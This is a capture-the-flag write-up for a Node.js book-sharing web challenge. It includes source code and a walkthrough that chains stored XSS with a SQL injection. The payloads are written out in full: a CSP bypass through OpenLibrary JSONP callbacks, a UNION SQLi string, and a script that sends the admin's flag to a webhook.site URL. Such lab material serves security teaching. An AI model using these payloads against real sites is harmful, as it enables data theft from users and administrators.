# Web Exploitation

**File:** [n6bwvr.zip](./n6bwvr.zip)

## File Structure:
n6bwvr.zip contains five files:  
- Dockerfile
- package-lock.json
- package.json
- README.md
- src folder

The src folder contains eight files:  
- assets folder
- books.json
- initDb.js
- main.js
- startingData.json
- utils.js
- utilsDb.js
- views folder

The assets folder contains five files:  
- icons folder
- scripts.js
- scriptsAuth.js
- styles.css
- stylesAuth.css

The views folder contains four files:  
- index.ejs
- login.ejs
- register.ejs
- view.ejs

## Given File Content:

### README.md:
To build the app: `docker built -t chal .`  
To run: `docker run -p 50001:1337 chal`  
  
To visit a reported link as admin:  
Login with these credentials on separate browser: `admin:admin`  
Visit the share link. 

Target:  
Make a solution script which auto exfiltrates the flag when admin visits a reported book.  
Provide walkthroughs on how you approached the challenge and found the parts to get the flag. 

### scripts.js:
```js
const MAX_PAGE_COUNT = 10000;
const BOOKS_FETCH_URL = "/getBooks";
const BOOKS_VIEW_URL = "/view";
const BOOKS_CREATE_URL = "/api/create";
const BOOKS_UPDATE_URL = "/api/update";
const BOOKS_DELETE_URL = "/api/delete";
const REPORT_URL = "/report";
const STATS_URL = "/stats";
const IMAGE_ROOT =
    "https://raw.githubusercontent.com/benoitvallon/100-best-books/master/static/";

const searchForm = document.querySelector(".form-search");
const newBookForm = document.querySelector(".form-new-book");
const formSearch = document.querySelector("#book-search");
const formTitle = document.querySelector("#book-title");
const formAuthor = document.querySelector("#book-author");
const formPages = document.querySelector("#book-pageCount");
const formUnread = document.querySelector('img[alt="unread"]');
const formRead = document.querySelector('img[alt="read"]');
const formSubmit = document.querySelector("#submit");
const templateCard = document.querySelector("#template-card");
const logoutFooter = document.querySelector("#logoutBtn");
let libraryRoot = document.querySelector(".content-inner");

function addClass(element, className) {
    element.classList.add(className);
}

function removeClass(element, className) {
    element.classList.remove(className);
}

function addRemoveClass(className, toRemove, toAdd) {
    toRemove.classList.remove(className);
    addClass(toAdd, className);
}

function hideElement(element) {
    addClass(element, "hidden");
}

function highlightError(field, focus = false) {
    addClass(field, "invalid-input");
    if (focus) field.focus();
}

function showConfirmPopup(message) {
    return confirm(message);
}


function readLs(key) {
    return false;

}

function writeLs(key, value) {
    localStorage.setItem(key, value);
}

function clearLs() {
    localStorage.clear();
}

function saveLibraryToLs() {
    // writeLs("library", JSON.stringify(library));
}

let cardTemplate = "";
async function initFillLibrary() {
    libraryRoot.innerHTML = "";

    if (!library.length) {
        let booksFetchUrl = BOOKS_FETCH_URL;
        if (document.location.pathname.includes("liteShare"))
            booksFetchUrl = document.location.pathname.replace(
                "liteShare",
                "view"
            );
        await fetch(booksFetchUrl)
            .then((resp) => resp.json())
            .then(
                (json) =>
                    (library = json.map((book) => ({
                        ...book,
                        fav: book.fav === "1" ? true : false,
                        read: book.read === "1" ? true : false,
                    })))
            );
        saveLibraryToLs();
    }

    templateCard.removeAttribute("id");
    cardTemplate = templateCard.outerHTML;
    templateCard.remove();

    if (library.length === 0)
        if (document.location.pathname.includes("liteShare"))
            libraryRoot.textContent = "liteShare Not Found";
        else libraryRoot.textContent = "No Books Saved";
    else library.forEach((book) => addBookToDomLibrary(book));
}

function addBookToDomLibrary(book, scrollToCard = false) {
    // clear "No Books Saved" message
    if (libraryRoot.childElementCount === 0) libraryRoot.innerHTML = "";

    libraryRoot.innerHTML += cardTemplate
        .replace("Book Title", book.title)
        .replace("Book Author", book.author);

    let cards = libraryRoot.querySelectorAll(".card");
    let card = cards[cards.length - 1];

    const pages = card.querySelectorAll(".card-text")[1];
    if (book.pages !== 0 && book.pages !== "0")
        pages.textContent = `${book.pages} pages`;
    else pages.remove();

    let bookImg = card.querySelector("img");
    if (!book.imageLink) bookImg.src = "";
    else if (
        book.imageLink?.startsWith("http") ||
        book.imageLink?.startsWith("/")
    )
        bookImg.src = book.imageLink;
    else bookImg.src = `${IMAGE_ROOT}${book.imageLink}`;
    bookImg.setAttribute(
        "alt",
        `Cover photo of ${book.title} by ${book.author}`
    );

    const notFavBtn = card.querySelector(".not-fav");
    const favBtn = card.querySelector(".fav");
    if (book.fav) {
        hideElement(notFavBtn);
    } else {
        hideElement(favBtn);
    }

    const unreadBtn = card.querySelector(".unread");
    const readBtn = card.querySelector(".read");
    if (book.read) {
        hideElement(unreadBtn);
    } else {
        hideElement(readBtn);
    }

    addListeners();

    if (scrollToCard) {
        card.scrollIntoView();
        addClass(card, "new-card");
    }
}

function addListeners() {
    const libraryRoot = document.querySelector(".content-inner");
    const cards = libraryRoot.querySelectorAll(".card");

    cards.forEach((card, i) => {
        const book = library[i];

        const bookImg = card.querySelector("img");

        if (book.link !== "")
            bookImg.addEventListener("click", () => window.open(book.link));

        const notFavBtn = card.querySelector(".not-fav");
        const favBtn = card.querySelector(".fav");
        const unreadBtn = card.querySelector(".unread");
        const readBtn = card.querySelector(".read");
        const toggleBtnList = [notFavBtn, favBtn, unreadBtn, readBtn];
        const deleteBtn = card.querySelector(".delete");
        const reportBtn = card.querySelector(".report");

        toggleBtnList.forEach((btn) =>
            btn.addEventListener("click", toggleCardButtonState)
        );
        deleteBtn.addEventListener("click", deleteBook);

        if (!document.location.pathname.includes("liteShare"))
            card.querySelector(".card-title").addEventListener("click", () =>
                window.open(
                    `liteShare/${document
                        .querySelector("#logoutBtn")
                        .textContent.trim()
                        .split(" ")[3]
                        .replace(":", "")}/${book.liteId}`
                )
            );
        else {
            if (getUsername() === document.location.pathname.split("/")[2])
                hideElement(reportBtn);
            else {
                toggleBtnList.forEach((btn) => btn.parentElement.remove());
                deleteBtn.remove();

                reportBtn.addEventListener("click", () =>
                    fetch(REPORT_URL, {
                        method: "post",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            user: document.location.toString().split("/")[4],
                            liteId: document.location.toString().split("/")[5],
                            reason: prompt("Why are you reporting this book?"),
                        }),
                    })
                        .then((r) => {
                            if (r.status === 429) return alert("Slow down");
                            if (r.redirected)
                                document.location = r.url ? r.url : "/login";
                            else return r.json();
                        })
                        .then((r) => alert(r.msg))
                );
            }
        }
    });
}

const fetchBookData = async (title, author) => {
    console.log(`Fetching book details for: ${title} by ${author}`);
    return await fetch(
        `https://openlibrary.org/search.json?title=${title}&author=${author}`
    )
        .then((r) => r.json())
        .then(async (r) => {
            let author, pages, imageLink, link;

            try {
                if (r.numFound === 0) return undefined;

                title = r.docs[0]?.title;
                link = `https://openlibrary.org/${r.docs[0]?.key}`;
                author = r.docs[0]?.author_name[0];
                pages = r.docs[0]?.number_of_pages_median;
                const isbn = r.docs[0]?.isbn[0];

                imageLink = await fetch(
                    `https://openlibrary.org/api/books?bibkeys=ISBN:${isbn}&format=json`
                )
                    .then((r) => r.json())
                    .then((r) =>
                        r[`ISBN:${isbn}`]?.thumbnail_url?.replace("-S", "-M")
                    );
            } catch (e) {
            } finally {
                if (!title) title = "";
                if (!author) author = "";
                if (!pages) pages = 0;
                if (!imageLink) imageLink = "";
                if (!link) link = "";
                return { title, author, pages, imageLink, link };
            }
        });
};

async function addBookFromUser() {
    let title = formTitle.value.trim();
    let author = formAuthor.value.trim();
    let pages = formPages.value.trim(),
        imageLink,
        link;

    if (title.length === 0) {
        highlightError(formTitle, true);
    } else if (author.length === 0) {
        highlightError(formAuthor, true);
    } else if (bookAlreadyExists(title)) {
        alert("Book already exists in library");
    } else if (
        Number(pages) < 0 ||
        Number(pages) > MAX_PAGE_COUNT ||
        (pages.length !== 0 && 
            isNaN(pages)) 
    )
        highlightError(formPages, true);
    else {
        formSubmit.classList.add("btn-loading");
        formSubmit.setAttribute("disabled", "");
        formSubmit.blur();

        let bookData;
        try {
            bookData = await fetchBookData(title, author);
        } catch (e) {}

        title = !bookData || bookData.title === "" ? title : bookData.title;
        author = !bookData || bookData.author === "" ? author : bookData.author;
        pages = !bookData || bookData.pages === 0 ? pages : bookData.pages;
        imageLink =
            !bookData || bookData.imageLink === ""
                ? "/assets/icons/bookshelf.svg"
                : `https://external-content.duckduckgo.com/iu/?u=${bookData.imageLink}`;
        link = !bookData ? "" : bookData.link;

        const book = new newBook(
            title,
            author,
            Number(pages),
            imageLink,
            link,
            formReadSwitch
        );

        await fetch(BOOKS_CREATE_URL, {
            method: "post",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(book),
        })
            .then((r) => {
                if (r.status === 429) return alert("Slow down");
                if (r.redirected) document.location = r.url ? r.url : "/login";
                else return r.json();
            })
            .then((r) => {
                formSubmit.classList.remove("btn-loading");
                formSubmit.removeAttribute("disabled");

                if (!r) return;
                if (r.status === "ok") {
                    library.push(r.book);
                    saveLibraryToLs();
                    addBookToDomLibrary(r.book, true);
                    setTimeout(() => {
                        formSubmit.classList.remove("btn-success");
                        formSubmit.removeAttribute("disabled");
                    }, 1000);
                    document
                        .querySelectorAll(".invalid-input")
                        .forEach((ele) =>
                            ele.classList.remove("invalid-input")
                        );

                    formTitle.value = "";
                    formAuthor.value = "";
                    formPages.value = "";
                } else setTimeout(() => alert(r.msg), 500);
            });
    }
}

class newBook {
    constructor(title, author, pages, imageLink, link, read) {
        this.title = title;
        this.author = author;
        this.pages = pages;
        this.imageLink = imageLink;
        this.link = link;
        this.read = read;
        this.fav = false;
    }
}

function bookAlreadyExists(givenTitle) {
    const titleLc = givenTitle.toLocaleLowerCase();
    if (library.find((book) => book.title.toLocaleLowerCase() === titleLc)) {
        const cards = libraryRoot.querySelectorAll(".card");
        let present = false;
        cards.forEach((card) => {
            const cardBookTitle = card.querySelector(".card-title").textContent;
            if (cardBookTitle.toLocaleLowerCase() === titleLc) {
                highlightError(card, true);
                addClass(card, "new-card");
                card.scrollIntoView();
                present = true;
            }
        });
        if (present) highlightError(formTitle);
        return true;
    }
    return false;
}

// book cards stuff below
async function toggleCardButtonState() {
    const cardButtons = this.parentElement.parentElement;
    const bookIndex = getBookTitle(cardButtons, true);

    const options = this.parentElement.dataset.options
        .split("|")
        .map((op) => `.${op}`);
    const offBtn = cardButtons.querySelector(options[0]);
    const onBtn = cardButtons.querySelector(options[1]);
    const key = options[1].slice(1);

    if (offBtn.classList.contains("hidden")) library[bookIndex][key] = false;
    else library[bookIndex][key] = true;

    const data = {
        title: library[bookIndex].title,
        fav: library[bookIndex].fav,
        read: library[bookIndex].read,
    };

    try {
        await fetch(BOOKS_UPDATE_URL, {
            method: "post",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data),
        })
            .then((r) => {
                if (r.status === 429) return alert("Slow down");
                if (r.redirected) document.location = r.url ? r.url : "/login";
                else return r.json();
            })
            .then((r) => {
                if (!r) return;
                if (r.status === "ok") {
                    if (offBtn.classList.contains("hidden"))
                        addRemoveClass("hidden", offBtn, onBtn);
                    else addRemoveClass("hidden", onBtn, offBtn);
                } else alert(r.msg);
            });
    } catch (e) {}

    saveLibraryToLs();
}

async function deleteBook() {
    const bookTitle =
        this.parentElement.parentElement.querySelector(
            ".card-title"
        ).textContent;

    if (!showConfirmPopup(`Delete the book [${bookTitle}]?`)) return;

    try {
        await fetch(`${BOOKS_DELETE_URL}?title=${bookTitle}`, {
            method: "post",
        })
            .then((r) => {
                if (r.status === 429) return alert("Slow down");
                if (r.redirected) document.location = r.url ? r.url : "/login";
                else return r.json();
            })
            .then((r) => {
                if (!r) return;
                if (r.status === "ok") {
                    this.parentElement.parentElement.remove();
                    if (libraryRoot.childElementCount === 0)
                        libraryRoot.textContent = "No Books Saved";
                    library = library.filter(
                        (book) => book.title !== bookTitle
                    );
                    saveLibraryToLs();
                } else alert(r.msg);
            });
    } catch (e) {}
}

const updateStats = () =>
    fetch(STATS_URL)
        .then((r) => {
            if (r.redirected) document.location = r.url ? r.url : "/login";
            return r.json();
        })
        .then(
            (r) =>
                (document.querySelector(
                    "#stats"
                ).textContent = `Powered by Lite! Home to ${r.count}+ books`)
        );

function getUsername(t = document.cookie.replace("token=", "")) {
    return JSON.parse(window.atob(t.split(".")[1])).data;
}

let formReadSwitch = false;
document.addEventListener("DOMContentLoaded", () => {
    try {
        logoutFooter.textContent = `Logged in as ${getUsername()}: Logout`;

        // remove all error highlights on keypress and form submit
        [formTitle, formAuthor, formPages].forEach((input) =>
            input.addEventListener("keypress", (e) => {
                e.target.classList.remove("invalid-input");
                const cards = libraryRoot.querySelectorAll(".card");
                cards.forEach((card) => card.classList.remove("invalid-input"));
            })
        );

        // toggleHeaderFormReadState
        [formUnread, formRead].forEach((btn) =>
            btn.addEventListener("click", () => {
                if (!btn.classList.contains("selected")) {
                    if (formUnread.classList.contains("selected")) {
                        formReadSwitch = true;
                        addRemoveClass("selected", formUnread, formRead);
                    } else {
                        formReadSwitch = false;
                        addRemoveClass("selected", formRead, formUnread);
                    }
                }
            })
        );

        formSubmit.addEventListener("click", (e) => {
            e.stopPropagation();

            if (newBookForm.classList.contains("hidden"))
                newBookForm.classList.remove("hidden");
            else addBookFromUser();
        });
    } catch (e) {}

    document.querySelector("#logoutBtn").addEventListener("click", () => {
        try {
            document.querySelector(eraseCookie("token"));
        } catch (e) {}
        document.location.replace("/login");
    });

    if (formSearch) formSearch.addEventListener("keyup", search);

    document.body.addEventListener("click", () => {
        const newCard = document.querySelector(".new-card");
        if (newCard !== null) removeClass(newCard, "new-card");
    });

    updateStats();
    setInterval(updateStats, 15000);
});

function getBookTitle(cardButtons, getIndexInstead = false) {
    let bookTitle =
        cardButtons.parentElement.querySelector(".card-title").textContent;
    if (getIndexInstead) {
        bookTitle = bookTitle.toLocaleLowerCase();
        return library.findIndex(
            (book) => book.title.toLocaleLowerCase() === bookTitle
        );
    }
    return bookTitle;
}

function eraseCookie(name) {
    document.cookie =
        name + "=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;";
}

function search() {
    const query = formSearch.value.toLocaleLowerCase().trim();

    if (!query) return initFillLibrary();

    const books = libraryRoot.querySelectorAll(".card");
    books.forEach((book) => book.classList.add("hidden"));

    const i = library.findIndex((book) =>
        book.title.toLocaleLowerCase().includes(query)
    );

    if (i != -1) books[i].classList.remove("hidden");
}

let library = JSON.parse(readLs("library"));

initFillLibrary();
```

### utils.js:
```js
const jwt = require("jsonwebtoken");

const generateAccessToken = (data, expiryTimeInSeconds = 60) =>
    jwt.sign({ data }, process.env.JWT_SECRET, {
        expiresIn: `${expiryTimeInSeconds}s`,
    });

const authCheck = (req, res, next) => {
    let ip = req.connection.remoteAddress;
    ip = ip.split("ff:")[1]?.split(".")[0];

    // direct admin entry to bot, only when visiting from localhost
    if (req.query.botToken === process.env.BOT_ACCESS_TOKEN && ip === "10") {
        const expireInSeconds = 20;
        const token = generateAccessToken("admin", expireInSeconds);
        const expires = new Date();
        expires.setTime(expires.getTime() + expireInSeconds * 1000);

        res.cookie("token", token, { expires });
        return res.redirect("/");
    }

    const token = req.cookies.token;
    if (token) {
        if (
            jwt.verify(token, process.env.JWT_SECRET, (err, data) => {
                if (req.url === "/login" || req.url === "/register")
                    if (err) next();
                    else res.redirect("/");
                else if (!err) {
                    next();
                } else return true;
            })
        ) {
            // delete token client side if it is invalid
            res.cookie("token", "", { expires: new Date(0) });
            return res.redirect("/login");
        }
    } else if (req.url === "/login" || req.url === "/register") return next();
    else return res.redirect("/login");
};

const getUsername = (req) => {
    return jwt.verify(req.cookies.token, process.env.JWT_SECRET, (err, data) =>
        err ? null : data?.data
    );
};

const shuffleArray = (array) => {
    let currentIndex = array.length,
        randomIndex;
    while (currentIndex > 0) {
        randomIndex = Math.floor(Math.random() * currentIndex);
        currentIndex--;
        [array[currentIndex], array[randomIndex]] = [
            array[randomIndex],
            array[currentIndex],
        ];
    }

    return array;
};

const removeUsernameFromData = (book) => {
    delete book.username;
    return book;
};

const toTitleCase = (str) => {
    try {
        return str
            .split(" ")
            .map((w) => {
                if (w === "") return;
                return w[0].toUpperCase() + w.substring(1).toLowerCase();
            })
            .join(" ");
    } catch (e) {
        return str;
    }
};

const handleError = (req, res, error, msg) => {
    console.log(`# ERROR at ${req.url}: ${error}`);
    return res.status(500).send({
        status: "error",
        msg,
    });
};

const handleAdminLockedError = (req, res, msg) => {
    // console.log(`# Stopped admit edit at ${req.url}`);
    return res.status(400).send({
        status: "error",
        msg,
    });
};

const BLACKLIST = ["delete", "update", "drop", "insert", "view", "sleep"];
const isSqlSafe = (input) => {
    let isSafe = true;
    BLACKLIST.forEach((word) =>
        input.toLowerCase().includes(word) ? (isSafe = false) : {}
    );
    return isSafe;
};

module.exports = {
    generateAccessToken,
    authCheck,
    getUsername,
    shuffleArray,
    removeUsernameFromData,
    toTitleCase,
    handleError,
    handleAdminLockedError,
    isSqlSafe,
};
```

## Writeup:
When I first unpacked the `challenge` folder, the `README.md` gave a pretty clear idea of how the application was meant to be run. The build instructions were straightforward and after firing up the container with the usual `docker build -t chal .` followed by `docker run -p 50001:1337 chal`, I could access the site locally. The `README` also hinted at the actual goal: the admin periodically visits any shared link and the objective was to craft a solution script or payload capable of automatically pulling the flag when the admin loads that page. That confirmed immediately that I’d be aiming for some kind of client side execution path that triggers during the admin’s visit.  
With that in mind, I started looking at the frontend and quickly noticed the rendering logic inside `scripts.js`, particularly the section that inserts book details into the `Document Object Model (DOM)` using `innerHTML`. The relevant part looked like this:
```js
libraryRoot.innerHTML += cardTemplate
    .replace("Book Title", book.title)
    .replace("Book Author", book.author);
```
Since `book.title` is directly inserted into the `DOM`, it was obvious that this property could be abused. However, because the rendering uses `innerHTML`, I initially expected `script` tags to fire but the strict `Content Security Policy (CSP)` immediately shut all of that down. The `CSP` only allowed resources from `self` and `openlibrary.org` so regular inline `scripts` or external `script links` from arbitrary domains were blocked outright. That pushed me toward exploring ways to execute `JavaScript` using only domains whitelisted by the `CSP`.  
While checking what `OpenLibrary` offered, I stumbled upon the fact that their API still supports `JSONP`. It is perfect in a `CSP` restricted environment because it loads as a script tag and the callback parameter allows arbitrary `JavaScript` to run. With that in mind, I set up a quick attempt to confirm whether executing arbitrary `JS `was possible. After registering a non admin account `(viteauth:vitepass)` on the local instance, I added a new book where the title was replaced with an `HTML iframe` containing a `script` tag using the `OpenLibrary JSONP` mechanism:
```jsonp
<iframe srcdoc="<script src='https://openlibrary.org/api/books?bibkeys=ISBN:9780143127796&jscmd=viewapi&callback=alert(1)'></script>"></iframe>
```
Once the book was added, the alert popped instantly, proving that `CSP` wasn’t preventing script execution as long as the source came from `OpenLibrary`. Checking `/getBooks` in the `Network` tab confirmed the payload had been stored exactly as intended:
```json
{
    "title": "<iframe srcdoc=\"<script src='https://openlibrary.org/api/books?bibkeys=ISBN:9780143127796&jscmd=viewapi&callback=alert(1)'></script>\"></iframe>",
    "author": "Viteauth",
    "pages": "123",
    "imageLink": "/assets/icons/bookshelf.svg",
    "link": "",
    "fav": "0",
    "read": "0",
    "liteId": "TFlqEkGahz"
}
```
Using the `liteId`, I opened the shared link `(/liteShare/viteauth/TFlqEkGahz)` while logged in as `admin` in a separate browser. The alert appeared again, this time in the admin’s context, which confirmed that the exploit path worked exactly as intended. So client side execution was sorted but the next question was: how do we extract the flag?  
Digging deeper into the backend code, `utils.js` revealed a blacklist based `SQL` filter:
```js
const BLACKLIST = ["delete", "update", "drop", "insert", "view", "sleep"];
```
Interestingly, `union` wasn’t blacklisted. Since the deletion endpoint in the backend plugged the title parameter directly into the `SQL` query, the lack of prepared statements meant `SQL` injection was possible. The raw query looked like:
```js
db.all('SELECT title FROM BOOKS WHERE title = "${title}"')
```
This allowed a `UNION-based` injection that returns arbitrary data controlled by another `SELECT`. It became clear that the flag was stored in the `link` field for some record so the simplest `SQLi` payload to retrieve it was:
```sql
" UNION SELECT link as title FROM BOOKS WHERE link LIKE "%flag%" --
```
By aliasing `link` as `title`, the `UNION` result maintained the structure required by the original query. That meant the API would respond with the flag wrapped inside a `{ book: { title: ... } } JSON object`.  
The next step was to pair the `SQLi` with the `Cross-Site Scripting (XSS)` so that the admin’s browser would automatically trigger the deletion request, extract the injected result and redirect the admin’s browser to my webhook endpoint with the flag appended as a query parameter. I used `webhook.site` to get a unique capture URL: `https://webhook.site/8721601b-f377-4f18-8a60-0d9013b0f0ba`  
My initial combined payload looked like this:
```jsonp
<iframe srcdoc="<script src='https://openlibrary.org/api/books?bibkeys=ISBN:9780143127796&jscmd=viewapi&callback=fetch('/api/delete?title='+encodeURIComponent('" UNION SELECT link as title FROM BOOKS WHERE link LIKE "%flag%" --'),{method:'POST'}).then(r=>r.json()).then(d=>window.top.location='https://webhook.site/8721601b-f377-4f18-8a60-0d9013b0f0ba?flag='+encodeURIComponent(d.book.title))'></script>"></iframe>
```
I added a new book with this payload, confirmed that the stored value appeared via `/getBooks` and tested it again with the admin. Nothing happened. No request reached the webhook. That suggested that some part of the `JS` inside the callback was breaking the `HTML attribute` parsing.  
To fix that, I encoded every problematic character so that the whole `JS` expression could flow correctly through the `iframe’s srcdoc`. After encoding, the payload turned into:
```jsonp
<iframe srcdoc="<script src='https://openlibrary.org/api/books?bibkeys=ISBN:9780143127796&jscmd=viewapi&callback=fetch%28%27%2Fapi%2Fdelete%3Ftitle%3D%27%2BencodeURIComponent%28%27%22%20UNION%20SELECT%20link%20as%20title%20FROM%20BOOKS%20WHERE%20link%20LIKE%20%22%25flag%25%22%20--%27%29%2C%7Bmethod%3A%27POST%27%7D%29.then%28r%3D%3Er.json%28%29%29.then%28d%3D%3E%7Bwindow.top.location%3D%27https%3A%2F%2Fwebhook.site%2F8721601b-f377-4f18-8a60-0d9013b0f0ba%3Fflag%3D%27%2BencodeURIComponent%28d.book.title%29%7D%29'></script>"></iframe>
```
Once again, I added a new book, fetched its `liteId` through `/getBooks` and opened its `/liteShare/...` URL in the admin browser. This time, the webhook recorded a `GET` request almost instantly. It contained the expected query parameter, and inside it was the flag.

## Flag:
```text
nite{test_flag_stp}
```
